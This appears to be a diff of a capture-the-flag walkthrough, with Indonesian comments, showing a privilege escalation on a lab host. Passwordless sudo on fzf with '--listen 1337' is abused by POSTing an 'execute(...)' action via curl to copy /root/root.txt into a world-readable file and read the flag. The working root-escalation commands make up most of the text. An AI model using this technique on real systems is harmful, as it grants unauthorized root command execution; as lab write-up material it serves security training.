@@ -1,7 +1,14 @@
-$ ssh leonardo@10.10.20.21 'bash -s' < /tmp/remote_exploit.sh
-(Transkrip live: fzf dijalankan sebagai root lewat script PTY, lalu action execute dikirim ke loopback.)
+$ ssh leonardo@10.10.20.21
+# fzf dijalankan sebagai root di dalam PTY, lalu action execute dikirim ke loopback.
+
+$ sudo -n /usr/local/bin/fzf --listen 1337
+# (listener aktif di 127.0.0.1:1337)
 
 LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
 
+$ curl -sS -X POST --data-binary 'execute(cp /root/root.txt /tmp/rootflag; chmod 644 /tmp/rootflag)' http://127.0.0.1:1337/
+
+$ cat /tmp/rootflag
 NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}
+$ ls -l /tmp/rootflag
 -rw-r--r-- 1 root root 33 Nov  9 15:57 /tmp/rootflag
